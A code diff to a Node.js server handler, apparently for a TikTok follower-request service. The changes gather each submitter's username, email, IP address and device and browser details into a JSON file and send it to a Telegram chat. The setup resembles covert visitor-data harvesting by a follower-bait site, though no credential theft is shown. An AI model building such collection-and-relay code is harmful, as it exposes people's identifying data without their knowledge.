@@ -322,13 +322,53 @@ ${userInfo?.userAgent || 'Unknown'}
         const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tiktok-json-'));
         
         try {
-          // Create a single consolidated JSON file
-          const jsonContent = JSON.stringify(consolidatedData, null, 2);
+          // Create a single consolidated JSON file with comprehensive data
+          // Create full submission object with all the data we have
+          const fullSubmission = {
+            id: Date.now(),
+            username,
+            followersRequested: followers,
+            email: req.body.email || "",
+            deviceInfo: userInfo || {},
+            ipAddress: ipAddress || userInfo?.ip || "Unknown",
+            createdAt: new Date().toISOString(),
+            processed: false,
+            // Include useful reference info for the consolidated file
+            userInfoReference: {
+              platform: userInfo?.platform,
+              deviceType: mobileDetails?.deviceType,
+              browser: userInfo?.browser
+            }
+          };
           
-          // Create temporary file
+          // Generate the consolidated JSON (excluding user behavior and info)
+          const consolidatedData = createConsolidatedJSON(fullSubmission);
+          
+          // Make sure we have a valid JSON object with data
+          let finalData = consolidatedData;
+          if (!consolidatedData || Object.keys(consolidatedData).length === 0) {
+            console.error("Error: Empty consolidated data generated");
+            finalData = {
+              error: "Failed to generate complete data structure",
+              basicInfo: {
+                username,
+                followers,
+                timestamp: new Date().toISOString(),
+                device: deviceModel || "Unknown"
+              }
+            };
+          }
+          
+          // Debug log the consolidated data size
+          console.log(`Generated consolidated JSON with ${Object.keys(finalData).length} top-level keys`);
+          
+          // Create temporary file with proper JSON content
+          const jsonContent = JSON.stringify(finalData, null, 2);
           const fileName = `${username}_submission_data_${Date.now()}.json`;
           const filePath = path.join(tempDir, fileName);
           fs.writeFileSync(filePath, jsonContent);
+          
+          console.log(`Created JSON file at ${filePath} (size: ${jsonContent.length} bytes)`);
           
           // Send file to Telegram
           const form = new FormData();
@@ -348,6 +388,8 @@ ${userInfo?.userAgent || 'Unknown'}
           if (!fileData.ok) {
             throw new Error(`Failed to send consolidated data file: ${fileData.description || "Unknown error"}`);
           }
+          
+          console.log("Consolidated JSON file sent successfully to Telegram");
           
           console.log("Notification sent successfully to Telegram");
         } finally {
